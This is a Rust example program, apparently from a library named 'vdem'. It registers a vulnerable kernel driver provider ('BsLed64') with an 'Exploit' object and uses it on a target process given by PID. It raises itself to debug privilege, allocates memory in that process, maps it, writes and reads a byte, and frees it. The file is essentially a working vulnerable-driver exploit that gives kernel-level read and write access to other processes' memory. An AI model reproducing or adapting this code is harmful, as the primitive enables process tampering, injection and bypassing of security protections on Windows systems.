use std::{env, format, println, ptr};

use providers::bsled::BsLed64;
use vdem::{
    exploit::Exploit,
    process::{Allocator, MapProcessMemory},
    utils::promote_privilege_to_debug_level,
};

fn main() {
    // Attention:
    // calling Exploit::mmap_process will cause BSOD if you pass a invalid address in user space
    // so it is a good choice to run it in debug mode to see what memory problems cause that BSOD
    #[cfg(debug_assertions)]
    unsafe {
        core::arch::asm!("int 3")
    }

    let args = env::args().collect::<Vec<String>>();

    if args.len() < 2 {
        panic!("Usage: {} <pid>", &args[0]);
    }

    let pid: u32 = u32::from_str_radix(&args[1], 10).expect("Invalid process id");

    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    const PAGE_READWRITE: u32 = 0x4;

    let (address, size) = exploit
        .allocate_process_memory(pid, ptr::null_mut(), 4096, PAGE_READWRITE)
        .expect(&format!(
            "Allocate virtual memory in process {} failed",
            pid
        ));

    println!("Successfully allocate virtual memory address = {:p}, size = {:x} in process: {}", address, size, pid);

    if let Ok(buffer) = exploit.mmap_process(pid, address as _, size as _) {
        println!(
            "Address {:p} in process {} successfully mapped at {:p}",
            address,
            pid,
            buffer.as_ptr()
        );

        // now we can read / write with buffer object
        println!("Write 1 byte to mapped memory, value = 0x5A");

        unsafe { ptr::write(buffer.as_ptr_mut().cast::<u8>(), 0x5A) };
        
        let value = unsafe { ptr::read(buffer.as_ptr().cast::<u8>()) };

        println!("Read 1 byte from mapped memory, value = {:x}", value);
    } else {
        println!("map failed");
    }

    exploit
        .free_process_memory(pid, address, size)
        .expect(&format!(
            "Failed to deallocate virtual address {:p} in process {}",
            address, pid
        ));

    println!("Freed virutal memory {:p} in process {}", address, pid);
}
